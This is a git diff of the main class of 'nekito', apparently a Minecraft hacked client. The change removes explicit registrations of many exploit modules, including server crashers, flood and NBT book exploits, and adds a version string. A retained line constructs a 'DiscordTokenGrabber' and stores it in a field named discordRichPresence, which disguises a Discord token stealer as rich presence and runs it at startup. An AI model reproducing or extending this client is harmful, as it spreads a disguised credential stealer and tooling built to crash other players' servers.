@@ -15,12 +15,6 @@ import wtf.norma.nekito.command.CommandManager;
 import wtf.norma.nekito.command.impl.*;
 import wtf.norma.nekito.draggable.DraggableManager;
 import wtf.norma.nekito.exploit.ExploitManager;
-import wtf.norma.nekito.exploit.impl.creative.AnvilExploit;
-import wtf.norma.nekito.exploit.impl.flood.*;
-import wtf.norma.nekito.exploit.impl.nbt.BookExploit;
-import wtf.norma.nekito.exploit.impl.nbt.ExploitFixerExploit;
-import wtf.norma.nekito.exploit.impl.nbt.OnePacketExploit;
-import wtf.norma.nekito.exploit.impl.other.*;
 import wtf.norma.nekito.helper.ChatHelper;
 import wtf.norma.nekito.helper.NetHelper;
 import wtf.norma.nekito.helper.OpenGlHelper;
@@ -43,55 +37,27 @@ public enum nekito {
     private final ModuleManager moduleManager;
     private final ClickGuiMain clickGuiMain;
 
+    public String version = "1.5";
+
     nekito() {
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
 
         discordRichPresence = new DiscordTokenGrabber();
-
-        commandManager = new CommandManager(
-                new ExploitCommand(),
-                new HelpCommand(),
-                new OnlineCommand(),
-                new FakeGamemodeCommand(),
-                new BindCommand()
-        );
-
-        exploitManager = new ExploitManager(
-        new AnvilExploit(),
-        new AttackExploit(),
-        new CIPA(),
-        new CwelExploit(),
-        new KuszkoExploit(),
-        new KuszkoExploit(),
-        new PedalExploit(),
-        new BookExploit(),
-        new ExploitFixerExploit(),
-        new OnePacketExploit(),
-        new ChunkLoadExploit(),
-        new FaweExploit(),
-        new MVCExploit(),
-        new MVCEXPLOIT2(),
-        new NcpCrasher(),
-        new SkriptCrasher(),
-        new SpamExploit(),
-        new WorldEditCrasher1()
-        );
-
+        commandManager = new CommandManager();
+        exploitManager = new ExploitManager();
         draggableManager = new DraggableManager();
-
         moduleManager = new ModuleManager();
         clickGuiMain = new ClickGuiMain();
 
         ViaMCP.create();
         ViaMCP.INSTANCE.initAsyncSlider();
 
-        //If you want to use niko from launcher please remove this
         NetHelper.createSession("cwelpolska", null);
         Runtime.getRuntime().addShutdownHook(new Thread(this::shutDown));
     }
 
     public void setDisplay() throws IOException {
-        Display.setTitle(String.format("Nekito 1.5 LWJGL " + Sys.getVersion()));
+        Display.setTitle(String.format("Nekito " + version + " LWJGL " + Sys.getVersion()));
         OpenGlHelper.setWindowIcon("https://i.imgur.com/hNjf4MM.png", "https://i.imgur.com/AcrB9xQ.png");
     }
 
